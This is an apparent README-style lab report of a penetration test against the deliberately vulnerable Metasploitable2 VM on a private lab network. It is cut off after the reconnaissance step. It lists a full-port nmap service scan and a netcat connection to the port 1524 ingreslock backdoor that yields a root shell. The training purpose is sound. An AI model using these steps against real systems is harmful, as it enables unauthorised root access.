# 🛡️ VAPT Lab Report - Metasploitable 2 | IqraSec Phase 2

> Assessment Type: Vulnerability Assessment & Penetration Testing (VAPT)  
> Target: Metasploitable2 - Linux (Intentionally Vulnerable VM)  
> Lab: VirtualBox NAT Network 10.0.2.0/24  
> Date: Oct 2026

![Kali](https://img.shields.io/badge/OS-Kali%20Linux-blue)
![Target](https://img.shields.io/badge/Target-Metasploitable2-red)
![Status](https://img.shields.io/badge/Status-Root%20Compromised-success)

## 📌 Executive Summary
Full VAPT lifecycle on Metasploitable2. Nmap found **30 open ports**. 
Exploited port 1524 ingreslock backdoor for instant root shell (uid=0).
**Key Command:** `nc 10.0.2.3 1524` → `root@metasploitable:/#`

## 🖥️ Lab Setup
- **Attacker:** Kali Linux 10.0.2.15
- **Victim:** Metasploitable2 10.0.2.3
- **Network:** NAT Network

## 🔍 Phase 1: Reconnaissance
```bash
sudo nmap -sV -sC -p- 10.0.2.3 -oN metasploitable_scan.txt
